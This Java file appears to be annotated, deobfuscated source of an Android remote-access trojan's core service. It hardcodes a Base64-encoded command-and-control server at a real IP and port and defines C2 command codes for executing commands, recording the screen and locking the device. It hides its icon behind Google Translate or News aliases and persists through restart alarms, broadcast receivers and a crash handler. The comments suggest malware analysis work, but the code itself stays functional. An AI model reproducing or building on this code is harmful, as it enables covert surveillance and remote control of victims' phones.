package com.android.pictach;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Environment;
import android.os.IBinder;
import java.io.File;
import java.lang.Thread;
import java.util.List;

/**
 * love — Main background service. The C2 engine core.
 *
 * Responsibilities:
 * 1. Holds the C2 server IP and port (Base64 encoded at rest)
 * 2. Holds the command queue (commandQueue / L_love_i) and loaded modules list
 * 3. Starts the Api service when everything is ready
 * 4. Registers broadcast receivers for package changes and screen events
 * 5. Schedules restart alarms on destroy/task removed
 *
 * C2 server details (decoded at runtime by Utils.base64Decode):
 *   Host = base64Decode("NjQuODkuMTYxLjE4OA") → "64.89.161.188"
 *   Port = base64Decode("Nzc3MQ")             → "7771"
 *
 * Command packet separator:
 *   packetSeparator = base64Decode("VHhUeFQ=") → "TxTxT"
 *   Every command string from C2 is split by "TxTxT" to get fields.
 */
public class love extends Service {

    // ─── Static fields ────────────────────────────────────────────────────────

    // List of received Config packets queued for processing by Api
    public static List<DataHelper> loadedModules;      // L_love_cl — loaded DEX module classes
    public static List<Config>     commandQueue;       // L_love_i  — incoming C2 command queue

    // Application context — set on first onCreate
    public static Context app_love_Context;

    // Self-reference for restart broadcasts
    static love instance;

    // C2 server connection details (Base64 encoded)
    // Decoded: "64.89.161.188"
    public static String Host = "NjQuODkuMTYxLjE4OA";

    // Decoded: "7771"
    public static String Port = "Nzc3MQ";

    // C2 packet separator — base64Decode("VHhUeFQ=") → "TxTxT"
    // Every command string is split by this to get fields:
    //   split[0] = command type, split[1..N] = command parameters
    public static String packetSeparator = Utils.base64Decode("VHhUeFQ=");

    // Icon alias mode: "T"=GoogleTranslate, "N"=googlenews, "C"=costm, "K"=hidden
    public static String Afterinstalloption = "K";

    // Timing / state
    public static long  commandTimeoutAt  = -1;    // e_love_co — timeout for current command
    public static int   loadedModuleCount = -1;    // p_love_lg — how many modules loaded
    public static int   inx               = -1;    // index into current command processing

    // C2 command code slots — assigned by server during initial handshake
    // Indices:
    //   [0]  = ping/handshake command code
    //   [1]  = host info command code
    //   [2]  = port info command code
    //   [3]  = config label
    //   [4]  = module invoke command code
    //   [5]  = execute command code
    //   [6]  = start screen record command code
    //   [7]  = stop screen record command code
    //   [8]  = disconnect command code
    //   [9]  = ping response command code
    //   [10] = wakelock command code
    //   [11] = status check command code
    //   [12] = stop live command code
    //   [13] = lock command code
    //   [14] = refresh command code
    //   [15] = send type command code
    //   [16] = close all command code
    public static String[] commandCodes = {
            "", "", "", "", "", "", "", "", "",
            "", "", "", "", "", "", "", ""
    };

    // Connection state
    public static boolean isConnected  = false;    // f1058k — socket connected
    public static boolean isLive       = false;    // k_love_live — live session active
    public static boolean isOrca       = false;    // F_love_ORCA — screen record active
    public static boolean isForceRecsc = false;    // FO_love_RSC
    public static boolean isHidden     = false;    // Is_love_Hidden — icon hidden

    // The active Firebase (AccessibilityService) instance
    // Set by Firebase.onServiceConnected()
    public static Firebase MyAccess = null;

    // True when app is fully initialized and connected
    public static boolean allok = false;

    // Package change broadcast receiver (C0200RC instance)
    public static BroadcastReceiver packageChangeReceiver = null;

    // ─── Service lifecycle ────────────────────────────────────────────────────

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            if (app_love_Context == null) {
                app_love_Context = getApplicationContext();
            }
        } catch (Exception unused) {
        }

        Utils.currentPrefKey = getApplicationContext()
                .getResources().getString(R.string.difficultye56);

        // Register package change receiver (monitors app installs/removes)
        try {
            if (packageChangeReceiver == null) {
                try {
                    new IntentFilter("android.intent.action.PHONE_STATE");
                    packageChangeReceiver = new C0200RC();
                    IntentFilter pkgFilter = new IntentFilter();
                    pkgFilter.addAction("android.intent.action.PACKAGE_ADDED");
                    pkgFilter.addAction("android.intent.action.PACKAGE_REMOVED");
                    pkgFilter.addAction("android.intent.action.PACKAGE_REPLACED");
                    pkgFilter.addAction("android.intent.action.PACKAGE_CHANGED");
                    pkgFilter.addAction("android.intent.action.PACKAGES_SUSPENDED");
                    pkgFilter.addDataScheme("package");
                    registerReceiver(packageChangeReceiver, pkgFilter);
                } catch (Exception unused2) {
                }
            }

            // Register screen on/off receiver (FirebaseApis)
            if (Utils.screenReceiver == null) {
                registerScreenReceiver(new IntentFilter("android.intent.action.SCREEN_ON"));
            }
        } catch (Exception unused3) {
        }
    }

    /**
     * Registers screen/power broadcast receiver with all relevant actions.
     * Returns true on success, false on failure.
     */
    private Boolean registerScreenReceiver(IntentFilter filter) {
        if (filter != null) {
            try {
                filter.addAction("android.intent.action.SCREEN_OFF");
                filter.addAction("android.intent.action.USER_PRESENT");
                filter.addAction("android.intent.action.ACTION_POWER_CONNECTED");
                filter.addAction("android.intent.action.ACTION_POWER_DISCONNECTED");
                Utils.screenReceiver = new FirebaseApis();
                registerReceiver(Utils.screenReceiver, filter);
                return true;
            } catch (Exception unused) {
            }
        }
        return false;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            if (app_love_Context == null) {
                app_love_Context = getApplicationContext();
            }
            Utils.currentPrefKey = app_love_Context
                    .getResources().getString(R.string.difficultye56);

            // Only start Api if everything is initialized and Api not already running
            if (!allok || !LoveApi0.isServiceNotRunning(Api.class, app_love_Context)) {
                return START_STICKY;
            }
            app_love_Context.startService(new Intent(app_love_Context, Api.class));
            return START_STICKY;
        } catch (Exception unused) {
            return START_REDELIVER_INTENT;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Utils.stateFlag0 = 0;
        instance = null;

        // Schedule restart alarm
        try {
            Utils.scheduleRestartAlarm(app_love_Context, "Error", 180000L);
        } catch (Exception unused) {
        }

        // Clean up receivers
        try {
            if (packageChangeReceiver != null) {
                unregisterReceiver(packageChangeReceiver);
            }
            if (Utils.screenReceiver != null) {
                unregisterReceiver(Utils.screenReceiver);
            }
            // Tell Bodybuilding receiver to restart sensor/services
            sendBroadcast(
                    new Intent(getApplicationContext(), Bodybuilding.class)
                            .setAction("RestartSensor")
            );
        } catch (Exception unused2) {
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        try {
            Utils.scheduleRestartAlarm(app_love_Context, "Error", 180000L);
        } catch (Exception unused) {
        }
        try {
            sendBroadcast(
                    new Intent(getApplicationContext(), Bodybuilding.class)
                            .setAction("RestartSensor")
            );
        } catch (Exception unused2) {
        }
    }

    // ─── Static helpers ───────────────────────────────────────────────────────

    /**
     * Deletes a log file from /sdcard/Config/sys/apps/log/log-{name}.txt
     * Called by C2 "rdd<*>" command.
     *
     * Original obfuscated name: D_love_ele
     */
    public static void deleteLogFile(String name) {
        try {
            File dir = new File(
                    Environment.getExternalStorageDirectory() + "/Config/sys/apps/log");
            File f = new File(dir, "log-" + name + ".txt");
            if (f.exists()) {
                f.delete();
            } else {
                new File(dir, "log-" + name + ".txt").delete();
            }
        } catch (Exception unused) {
        }
    }

    /**
     * Lists all log files in /sdcard/Config/sys/apps/log/
     * Returns filenames joined by "*".
     * Called by C2 status check command.
     *
     * Original obfuscated name: Get_love_Logs
     */
    public static String getLogFileList() {
        try {
            String result = "";
            File dir = new File(
                    Environment.getExternalStorageDirectory().toString()
                            + "/Config/sys/apps/log");
            for (File f : dir.listFiles()) {
                result = result + f.getName() + "*";
            }
            return result;
        } catch (Exception unused) {
            return "";
        }
    }

    // ─── Inner class — crash handler ─────────────────────────────────────────

    /**
     * Catches uncaught exceptions and schedules a service restart.
     * Prevents the app from dying permanently on crash.
     */
    public class MyExceptionHandler implements Thread.UncaughtExceptionHandler {
        private final Class<?>  activityClass;
        private final Context   context;

        public MyExceptionHandler(Context ctx, Class<?> cls) {
            this.context       = ctx;
            this.activityClass = cls;
        }

        @Override
        public void uncaughtException(Thread thread, Throwable th) {
            try {
                Utils.scheduleRestartAlarm(this.context, "Error", 180000L);
                love.this.sendBroadcast(
                        new Intent(love.this.getApplicationContext(), Bodybuilding.class)
                                .setAction("RestartSensor")
                );
            } catch (Exception unused) {
            }
        }
    }
}
